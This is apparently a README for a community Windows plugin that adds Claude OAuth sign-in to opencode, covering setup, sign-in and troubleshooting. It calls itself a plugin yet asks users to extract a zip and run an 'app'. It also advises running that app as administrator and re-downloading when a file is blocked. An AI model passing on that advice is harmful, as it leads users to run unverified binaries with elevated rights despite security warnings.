## 🖥️ What this is

This tool adds Anthropic Claude Pro or Max OAuth sign-in support for opencode

It helps you connect your Claude account in a way that is simple to use on a Windows PC

Use it if you want a community-built auth plugin that works with your existing opencode setup

## ✅ What you need

- A Windows computer
- An internet connection
- A web browser such as Chrome, Edge, or Firefox
- An opencode setup already on your computer
- A Claude Pro or Max account

## 🔐 First-time sign-in

After you install the plugin, open opencode

Start the Claude sign-in flow from the auth option inside the app

A browser window may open for account access

Sign in with the Claude account you want to use

Approve the request if the browser asks for access

Return to opencode after the sign-in finishes

## ⚙️ How to use it

Once the plugin is installed, opencode can use your Claude OAuth connection during normal use

Open opencode the same way you always do

Choose the Anthropic auth option when asked

Keep your browser signed in to the right Claude account if you use more than one account

If you switch accounts later, sign out first and connect again with the new account

## 🛠️ If something does not work

If the app does not open, try these steps:

1. Download the latest release again
2. Make sure you extracted the zip file
3. Right-click the app and choose Run as administrator
4. Check that your browser opens for sign-in
5. Confirm that you are signed into the right Claude account
6. Close opencode and open it again
7. Restart your PC if the sign-in flow gets stuck

If the page says the file was blocked, use the newest release from the download page again and try a fresh download

If the browser closes before sign-in ends, reopen opencode and start the auth step again
